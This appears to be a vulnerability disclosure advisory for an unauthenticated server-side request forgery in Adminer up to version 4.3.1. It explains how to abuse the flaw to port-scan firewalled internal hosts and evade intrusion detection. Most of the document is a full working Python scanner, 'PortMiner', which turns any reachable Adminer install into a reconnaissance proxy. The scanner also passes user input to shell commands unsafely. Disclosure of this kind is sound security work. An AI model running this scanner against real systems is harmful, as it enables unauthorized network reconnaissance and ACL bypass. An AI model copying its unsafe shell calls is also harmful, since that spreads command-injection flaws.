[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/ADMINER-UNAUTHENTICATED-SERVER-SIDE-REQUEST-FORGERY.txt
[+] ISR: apparition security           
 


Vendor:
==============
www.adminer.org


Product:
================
Adminer <= v4.3.1 

Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a
single file ready to deploy to the target server. Adminer is available for MySQL, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.

https://github.com/vrana/adminer/releases/


Vulnerability Type:
===================
Server Side Request Forgery


CVE Reference:
==============
N/A


Security Issue:
================
Adminer allows unauthenticated connections to be initiated to arbitrary systems/ports. This vulnerability can be used to potentially bypass firewalls to
identify internal hosts and perform port scanning of other servers for reconnaissance purposes. Funny thing is Adminer throttles invalid login attempts
but allows endless unauthorized HTTP connections to other systems as long as your not trying to authenticate to Adminer itself.

Situations where Adminer can talk to a server that we are not allowed to (ACL) and where we can talk to the server hosting Adminer, it can do recon for us.

Recently in LAN I was firewalled off from a server, however another server running Adminer I can talk to. Also, that Adminer server can talk to the target.
Since Adminer suffers from Server-Side Request Forgery, I can scan for open ports and gather information from that firewalled off protected server.
This allowed me to not only bypass the ACL but also hide from the threat detection system (IDS) monitoring east west connections. 

However, sysadmins who check the logs on the server hosting Adminer application will see our port scans.

root@lamp log/apache2# cat other_vhosts_access.log
localhost:12322 ATTACKER-IP - - [2/Jan/2018:14:25:11 +0000] "GET ///?server=TARGET-IP:21&username= HTTP/1.1" 403 1429 "-" "-"
localhost:12322 ATTACKER-IP - - [2/Jan/2018:14:26:24 +0000] "GET ///?server=TARGET-IP:22&username= HTTP/1.1" 403 6019 "-" "-"
localhost:12322 ATTACKER-IP - - [2/Jan/2018:14:26:56 +0000] "GET ///?server=TARGET-IP:23&username= HTTP/1.1" 403 6021 "-" "-"


Details:
==================
By comparing different failed error responses from Adminer when making SSRF bogus connections, I figured out which ports are open/closed.

Port open ==> Lost connection to MySQL server at &#039;reading initial communication packet
Port open ==> MySQL server has gone away
Port open ==> Bad file descriptor 
Port closed ==> Can&#039;t connect to MySQL server on &#039;<TARGET-IP>&#039;;
Port closed ==> No connection could be made because the target machine actively refused it
Port closed ==> A connection attempt failed. 

This worked so well for me I wrote a quick port scanner &#039;PortMiner&#039; as a proof of concept that leverages Adminer SSRF vulnerability.


PortMiner observations:
======================
No response &#039;read operation timed out&#039; means the port is possibly open or filtered and should be given a closer look if possible. This seems to occur when scanning
Web server ports like 80, 443. However, when we get error responses like the ones above from the server we can be fairly certain a port is either open/closed. 

Quick POC:
echo -e &#039;HTTP/1.1 200 OK\r\n\r\n&#039; | nc -l -p 5555
Use range 5555-5555


Exploit/POC:
=============
import socket,re,ssl,warnings,subprocess,time
from platform import system as system_name 
from os import system as system_call

#Adminer Server Side Request Forgery
#PortMiner Scanner Tool
#by John Page (hyp3rlinx)
#ISR: ApparitionSec
#hyp3rlinx.altervista.org 
#=========================
#D1rty0Tis says hi.

#timeout
MAX_TIME=32
#ports to log
port_lst=[]  
#Web server response often times out but usually means ports open.
false_pos_ports=[&#039;80&#039;,&#039;443&#039;] 

BANNER=&#039;&#039;&#039;
           ____            _   __  __ _                  
          |  _  \         | | |  \/  (_)                 
          | |__) |__  _ __| |_| \  / |_ _ __   ___ _ __  
          |  ___/ _ \| &#039;__| __| |\/| | | &#039;_ \ / _ \ &#039;__| 
          | |  | (_) | |  | |_| |  | | | | | |  __/ |    
          |_|   \___/|_|   \__|_|  |_|_|_| |_|\___|_|                                                                                                             
       &#039;&#039;&#039;                               
   

def info():
    print "\nPortMiner depends on Error messages to determine open/closed ports."
    print "Read operations reported &#039;timed out&#039; may be open/filtered.\n"


def greet():
    print &#039;Adminer Unauthenticated SSRF Port Scanner Tool&#039;
    print &#039;Targets Adminer used for MySQL administration\n&#039;
    print &#039;by hyp3rlinx - apparition security&#039;
    print &#039;-----------------------------------------------------\n&#039;
    print &#039;Scan small ranges or single ports or expect to wait.\n&#039;
    print &#039;Do not scan networks without authorized permission.&#039;
    print &#039;Author not responsible for abuse/misuse.\n&#039;

    
def chk_ports(p): 
    p=p.replace(&#039;-&#039;,&#039;,&#039;)
    port_arg=p.split(&#039;,&#039;)
    try:
        if len(port_arg)>1:
            if int(port_arg[1]) < int(port_arg[0]):
                print &#039;Port range not valid.&#039;
                raw_input()
                return
            if int(port_arg[1])>65535:
                print &#039;Exceeded max Port range 65535.&#039;
                raw_input()
                return
    except Exception as e:
        print str(e)
        return None
    return list(range(int(port_arg[0]),int(port_arg[1])+1))



def log(IP):
    try:
        file=open(&#039;PortMiner.txt&#039;, &#039;w&#039;)
        file.write(IP+&#039;\n&#039;)
        for p in port_lst:
            file.write(p+&#039;\n&#039;)
        file.close()
    except Exception as e:
        print str(e)
    print "\nSee PortMiner.txt"


def use_ssl(ADMINER,ADMINER_PORT):
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ADMINER,int(ADMINER_PORT)))
        s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
        s.close()
    except Exception as e:
        print ""
        return False
    return True


def version(ip,port,uri,use_ssl):
    res=""
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,int(port)))
        if use_ssl:
            s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) 
        s.send(&#039;GET &#039;+&#039;/&#039;+uri+&#039;/?server=&#039;+&#039;:&#039;+&#039;&username=\r\n\r\n&#039;)

    except Exception as e:
        print &#039;Host up but cant connect.&#039; #str(e)
        print &#039;Re-check Host/Port/URI.&#039;
        s.close()
        return 504
     
    while True:
        RES=s.recv(512)
        if RES.find(&#039;Forbidden&#039;)!=-1:
            print &#039;Forbidden 403&#039;
            s.close()
            return None
        if RES.find(&#039;401 Authorization Required&#039;)!=-1:
            print &#039;401 Authorization Required&#039;
            s.close()
            return None
        ver = re.findall(r&#039;<span class="version">(.*)</span>&#039;,RES,re.DOTALL|re.MULTILINE)
        if not RES:
            s.close()
            return None
        if ver:
            print &#039;Your Adminer &#039;+ ver[0] + &#039; works for us now.&#039;
            s.close()
            return ver

    s.close()
    return None
 
       
               
def scan(ADMINER,ADMINER_PORT,ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL):
    global MAX_TIME,port_range
    RES=&#039;&#039;

    print &#039;scanning ports: %s &#039; % str(port_range[0])+&#039;to &#039; + str(port_range[-1])+&#039; ...&#039;
    
    for aPort in port_range: 
         aPort=str(aPort)
         
         try:
             s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(MAX_TIME)
             s.connect((ADMINER,ADMINER_PORT))
    
             if USE_SSL:
                s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) 

             s.send(&#039;GET /&#039;+ADMINER_URI+&#039;/?server=&#039;+TARGET+&#039;:&#039;+aPort+&#039;&username= HTTP/1.1\r\nHost: &#039;+TARGET+&#039;\r\n\r\n&#039;)
    
         except Exception as e:
              print str(e)
              s.close()
              return

         while True:
              try:
                 RES=s.recv(512)
                 ###print RES
                 ###Should see HTTP/1.1 403 not 200
                 if RES.find(&#039;HTTP/1.1 200 OK&#039;)!=-1:
                     print &#039;port &#039;+aPort +  &#039; open&#039;
                     port_lst.append(aPort+&#039; open&#039;)
                     s.close()
                     break
                    
                 if RES.find(&#039;400 Bad Request&#039;)!=-1:
                     print &#039;400 Bad Request, check params&#039;
                     s.close()
                     break
                     raw_input()                  

                 lst=re.findall(r"([^\n<div class=&#039;error&#039;>].*connect to MySQL server on.*[^</div>\n])|(Lost connection to MySQL server at.*)|(MySQL server has gone away.*)"+
                             "|(No connection could be made because the target machine actively refused it.*)|(A connection attempt failed.*)|(HTTP/1.1 200 OK.*)", RES)     
        
                 if lst:
                      status=str(lst)
                      if status.find(&#039;connect to MySQL&#039;)!=-1:
                          if PRINT_CLOSED:
                              print &#039;port &#039;+ aPort +  &#039; closed&#039;
                          s.close()
                          break
                      elif status.find(&#039;machine actively refused it.&#039;)!=-1:
                          if PRINT_CLOSED:
                              print &#039;port &#039;+ aPort +  &#039; closed&#039;
                          s.close()
                          break
                      elif status.find(&#039;A connection attempt failed&#039;)!=-1:
                          if PRINT_CLOSED:
                               print &#039;port &#039;+ aPort +  &#039; closed&#039;
                          s.close()
                          break
                      elif status.find(&#039;reading initial communication packet&#039;)!=-1:
                          print &#039;port &#039;+aPort +  &#039; open&#039;
                          port_lst.append(aPort+&#039; open&#039;)
                          s.close()
                          break
                      elif status.find(&#039;MySQL server has gone away&#039;)!=-1:
                          print &#039;port &#039;+aPort +  &#039; open&#039;
                          port_lst.append(aPort+&#039; open&#039;)
                          s.close()
                          break
                      elif status.find(&#039;Bad file descriptor&#039;)!=-1:
                          print &#039;port &#039;+aPort +  &#039; open&#039;
                          port_lst.append(aPort+&#039; open&#039;)
                          s.close()
                          break
                      elif status.find(&#039;Got packets out of order&#039;)!=-1:
                          print &#039;port &#039;+aPort +  &#039; open&#039;
                          s.close()
                          break
                        
              except Exception  as e:
                  msg = str(e)
                  ###print msg
                  if msg.find(&#039;timed out&#039;)!=-1 and aPort in false_pos_ports:
                      print &#039;port &#039;+aPort +  &#039; open&#039;
                      port_lst.append(aPort+&#039; open&#039;)
                      s.close()
                      break
                  elif msg.find(&#039;timed out&#039;)!=-1: 
                      print &#039;port &#039;+aPort + &#039; timed out&#039;
                      port_lst.append(aPort+&#039; read operation timed out&#039;)
                      s.close()
                      break
                  else:
                      s.close()
                      break
               
    if port_lst:
        log(TARGET)
    else:
        print "Scan completed, no ports mined."
    return 0



def arp(host):
    args = "-a" if system_name().lower()=="windows" else "-e"
    return subprocess.call("arp " + args + " " + host, shell=True) == 0
         

def ping_host(host):
    args = "-n 1" if system_name().lower()=="windows" else "-c 1"
    res=subprocess.call("ping " + args + " " + host, shell=True) == 0
    if not res:
        print str(host) + &#039; down? trying ARP&#039;
        if not arp(host):
            print str(host) + &#039; unreachable.&#039;
            return
    return res

    

def main():
    global port_range
    print BANNER
    greet()
    ADMINER_VERSION=False
    PRINT_CLOSED=False
    USE_SSL=None

    ADMINER=raw_input(&#039;[+] Adminer Host/IP> &#039;)
    if ADMINER==&#039;&#039;:
        print &#039;Enter valid Host/IP&#039;
        ADMINER=raw_input(&#039;[+] Adminer Host/IP> &#039;)
    
    ADMINER_PORT=raw_input(&#039;[+] Adminer Port> &#039;)
    if not re.search("^\d{1,5}$",ADMINER_PORT):
        print &#039;Enter a valid Port.&#039;
        ADMINER_PORT=raw_input(&#039;[+] Adminer Port> &#039;)
    
    ADMINER_URI=raw_input(&#039;[+] Adminer URI [the adminer-<version>.php OR adminer/ dir path] > &#039;)
    TARGET=raw_input(&#039;[+] Host/IP to Scan> &#039;)
    
    PORTS_TO_SCAN=raw_input(&#039;[+] Port Range e.g. 21-25> &#039;).replace(&#039; &#039;,&#039;&#039;)
    plst=re.findall(r"(\d{1,5})-(\d{1,5})",PORTS_TO_SCAN)
    if not plst:
        print &#039;Invalid ports, format is 1-1025&#039;
        return
        raw_input() #console up

    port_range=chk_ports(PORTS_TO_SCAN)
    if not port_range:
        return

    PRINT_CLOSED=raw_input(&#039;[+] Print closed ports? 1=Yes any key for No> &#039;)
    if PRINT_CLOSED==&#039;1&#039;:
        PRINT_CLOSED=True
    else:
        PRINT_CLOSED=False
    
    if not ping_host(ADMINER):
        print &#039;host %s not reachable or blocking ping &#039; % ADMINER  
        cont=raw_input(&#039;Continue with scan? 1=Yes any key for No> &#039;)
        if cont!=&#039;1&#039;:
            print &#039;Scan aborted.&#039;
            raw_input() #console up
            return
        

    USE_SSL=use_ssl(ADMINER,ADMINER_PORT)
    time.sleep(2)
    ADMINER_VERSION = version(ADMINER,ADMINER_PORT,ADMINER_URI,USE_SSL)

    if not ADMINER_VERSION:
        print "Can&#039;t retrieve Adminer script. check supplied URI."
        raw_input() #console up
        return
    else:
        if ADMINER_VERSION==504:
            raw_input() #console up
            return
        if scan(ADMINER,int(ADMINER_PORT),ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL)==0:
            more=raw_input(&#039;Info: 1=Yes, any key for No> &#039;)
            if more==&#039;1&#039;:
                info()
                raw_input() #console up

    
if __name__==&#039;__main__&#039;:
    main()

